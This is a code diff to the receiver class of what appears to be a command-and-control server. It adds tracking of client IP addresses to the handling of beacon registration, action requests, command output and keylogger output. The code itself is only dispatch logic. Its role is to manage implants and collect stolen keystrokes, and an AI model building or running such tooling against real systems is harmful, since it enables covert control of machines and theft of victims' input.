@@ -464,44 +464,56 @@ class BaseReceiver(QObject):
         """Process command data and return response string"""
         parts = data_str.split('|')
         command = parts[0]
-        
+
+        # Extract IP address from client_info
+        ip_address = None
+        if "address" in client_info:
+            address = client_info["address"]
+            # Handle tuple format (ip, port) for TCP/HTTP
+            if isinstance(address, tuple) and len(address) >= 1:
+                ip_address = address[0]
+            # Handle string format for other protocols
+            elif isinstance(address, str):
+                ip_address = address
+
         try:
             # Use existing command processor logic
             if command == "command_output" and len(parts) >= 2:
                 beacon_id = parts[1]
                 output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                 return self.command_processor.process_command_output(beacon_id, output)
-                
+
             elif command == "keylogger_output" and len(parts) >= 2:
                 beacon_id = parts[1]
                 output = data_str.split('|', 2)[2] if len(parts) > 2 else ""
                 return self.command_processor.process_keylogger_output(beacon_id, output)
-                
+
             else:
                 # Standard command dispatch
                 response = {
                     "register": lambda: self.command_processor.process_registration(
-                        parts[1], parts[2], self.receiver_id, self.name
-                    ) if len(parts) == 3 else "Invalid registration format",
-                    
+                        parts[1], parts[2], self.receiver_id, self.name, ip_address,
+                        parts[3] if len(parts) >= 4 else None
+                    ) if len(parts) >= 3 else "Invalid registration format",
+
                     "request_action": lambda: self.command_processor.process_action_request(
-                        parts[1], self.receiver_id, self.name
+                        parts[1], self.receiver_id, self.name, ip_address
                     ) if len(parts) == 2 else "Invalid request format",
-                    
+
                     "download_complete": lambda: self.command_processor.process_download_status(
                         parts[1], parts[2], "download_complete"
                     ) if len(parts) == 3 else "Invalid download status format",
-                    
+
                     "download_failed": lambda: self.command_processor.process_download_status(
                         parts[1], parts[2], "download_failed"
                     ) if len(parts) == 3 else "Invalid download status format",
-                    
+
                     "checkin": lambda: "Check-in acknowledged"
                         if len(parts) == 2 else "Invalid checkin format",
                 }.get(command, lambda: "Unknown command")()
-                
+
                 return response
-                
+
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"Error processing command {command}: {e}")
